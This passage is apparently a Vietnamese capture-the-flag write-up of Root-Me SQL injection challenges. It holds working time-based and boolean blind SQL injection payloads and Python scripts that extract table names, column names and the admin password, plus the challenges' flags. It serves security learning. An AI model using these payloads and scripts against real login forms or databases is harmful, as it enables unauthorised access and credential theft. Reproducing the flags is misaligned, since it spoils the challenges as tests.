            payload = f"1;SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users limit 1 offset 0),{i},1))={j}) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
            PARAMS = {"action": "member", "member": payload}
            http = requests.get(url=URL, params=PARAMS, verify=False, proxies=proxies)
            if int((http.elapsed.total_seconds())) >= 2:
                password += chr(j)
                sys.stdout.write('\r' + 'Kết quả là: ' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + 'Kết quả là: ' + password + chr(j))
                sys.stdout.flush()

if __name__ == "__main__":
    passwd()
```

Kết quả : 

![image](https://hackmd.io/_uploads/Bkdzvypr6.png)

Flag : T!m3B@s3DSQL!

## [11. Blind](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Blind)

![image](https://hackmd.io/_uploads/B1OOVlara.png)

Bài này trở về với form login quen thuộc 

![image](https://hackmd.io/_uploads/rko54epSp.png)

Đầu tiên thử test với payload `admin'`

![image](https://hackmd.io/_uploads/SkSgHe6Ba.png)

Thì hiện thông báo lỗi

![image](https://hackmd.io/_uploads/r16bHlpHa.png)

Từ thông báo lỗi này đang biết được rằng trang web đang sử dụng SQLite3. Bây giờ nếu ta thêm dấu comment vào thì sao `admin'-- -`

![image](https://hackmd.io/_uploads/Sys8HeTB6.png)

Và boom

![image](https://hackmd.io/_uploads/S1yuBxaBa.png)

Ta đăng nhập được thành công cơ mà làm gì có flag -.- 

Còn nếu đăng nhập bình thường thì sẽ như nào 

![image](https://hackmd.io/_uploads/H1vnBgTBp.png)

![image](https://hackmd.io/_uploads/Byz6repB6.png)


Từ đây ta nhận biết dấu hiệu rằng nếu True thì thông báo trả về sẽ là `Welcome back admin !` 

Từ đây ý tưởng exploit sẽ là kết hợp với điều kiện `AND`. Ví dụ ta tìm length table_name ở vị trí 0

`admin'+AND+(SELECT+LENGTH(name)+from+sqlite_master+WHERE+type='table'+limit+1+offset+0)=5--+-`

![image](https://hackmd.io/_uploads/ryCOLl6rp.png)

![image](https://hackmd.io/_uploads/r1zcIe6Hp.png)

Từ đây ta biết được length của table_name[0] là 5

Ok cứ với ý tưởng trên ta sẽ viết code như sau : 

```python=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
URL = "http://challenge01.root-me.org/web-serveur/ch10/"

def lenght_table(offset):
    for i in range(0, 30):
        payload = f"admin' AND (SELECT LENGTH(name) from sqlite_master WHERE type='table' limit 1 offset {offset})={i}-- -"
        DATA = {"username":payload, "password": "123"}
        http = requests.post(url=URL, data=DATA, verify=False, proxies=proxies)
        if "Welcome back admin !" in http.text:
            return i

def table_name():
    #10 column đầu tiên
    for k in range(0,10):
        length = lenght_table(k)
        if length is None:
            continue
        print(f"Table tại offset {k} có {length} kí tự , đang dò tên table, loading... ")
        table=''
        for i in range(1, length + 1):
            for j in range(97, 123):
                payload = f"admin' AND (SELECT SUBSTR((SELECT name FROM sqlite_master WHERE type='table' limit 1 offset {k}),{i},1))='{chr(j)}'-- -"
                DATA = {"username": payload, "password": "123"}
                http = requests.post(url=URL, data=DATA, verify=False, proxies=proxies)
                if "Welcome back admin !" in http.text:
                    table+=chr(j)
                    sys.stdout.write('\r' + 'Kết quả là : ' + table)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + 'Kết quả là : ' + table + chr(j))
                    sys.stdout.flush()
        print('\n')

if __name__ == "__main__":
    table_name()
```

Kết quả 

![image](https://hackmd.io/_uploads/Sym2k-aSp.png)

Tiếp tục tìm colum_name , code tương tự ở trên chỉ cần thay 2 payload sau : 

`payload = f"admin' AND (SELECT LENGTH(name) FROM pragma_table_info('users') limit 1 offset {offset})={i}-- -"`

`payload = f"admin' AND (SELECT SUBSTR((SELECT name FROM pragma_table_info('users') limit 1 offset {k}),{i},1))='{chr(j)}'-- -"`

Kết quả : 

![image](https://hackmd.io/_uploads/B1b3CtaHT.png)

Tìm được 2 column quan trọng là `username` và `password`

Ok bây giờ tìm password thôi code như sau : 

```python=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
URL = "http://challenge01.root-me.org/web-serveur/ch10/"

def lenght_passwd():
    for i in range(0, 30):
        payload = f"admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin' limit 1)={i}-- -"
        DATA = {"username":payload, "password": "123"}
        http = requests.post(url=URL, data=DATA, verify=False, proxies=proxies)
        if "Welcome back admin !" in http.text:
            return i

def column_name():
    length = lenght_passwd()
    print(f"Password có {length} kí tự , đang dò password, loading... ")
    password = ''
    for i in range(1, length + 1):
        for j in range(32, 126):
            payload = f"admin' AND (SELECT SUBSTR((SELECT password FROM users WHERE username='admin' limit 1),{i},1))='{chr(j)}'-- -"
            DATA = {"username": payload, "password": "123"}
            http = requests.post(url=URL, data=DATA, verify=False, proxies=proxies)
            if "Welcome back admin !" in http.text:
                password += chr(j)
                sys.stdout.write('\r' + 'Kết quả là : ' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + 'Kết quả là : ' + password + chr(j))
                sys.stdout.flush()

if __name__ == "__main__":
    column_name()
```

Kết quả 

![image](https://hackmd.io/_uploads/S1R1Qq6Sa.png)

Flag : e2azO93i

## [12. Second Order](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Second-Order)

![image](https://hackmd.io/_uploads/SJabZh6B6.png)

Chưa giải được :<

## [13. Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)

![image](https://hackmd.io/_uploads/ryscx3aBp.png)

Đang giải ...

